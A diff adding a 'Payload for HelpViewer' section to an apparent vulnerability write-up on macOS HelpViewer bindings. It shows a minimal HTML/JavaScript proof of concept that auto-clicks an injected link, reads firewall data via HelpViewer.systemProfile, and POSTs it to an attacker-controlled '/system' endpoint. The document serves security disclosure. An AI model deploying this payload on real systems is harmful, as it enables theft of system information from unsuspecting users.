@@ -88,6 +88,33 @@ As I said, `window.HelpViewer` bindings are poorly written (from security) and i
 Parallels for Mac: 14.1.0 (45387)
 macOS: macOS 10.14.3
 
+## Payload for HelpViewer
+
+Minimal PoC:
+
+```html
+<body>
+  <h1>@Metnew</h1>
+  <script type="text/javascript">
+    var a = document.createElement("a");
+    a.href = "${payloadLink}";
+    a.innerHTML = "Click me!";
+    document.body.appendChild(a);
+    a.click();
+
+    const result = HelpViewer.systemProfile(["SPFirewallDataType"]);
+    fetch("/system", {
+      method: "POST",
+      body: JSON.stringify({ data: result }),
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json"
+      }
+    });
+  </script>
+</body>
+```
+
 ## PoC for HelpViewer
 
 1. Copy HTML from `payload` variable from `attacker-https/index.js` to any helpbook on your system.
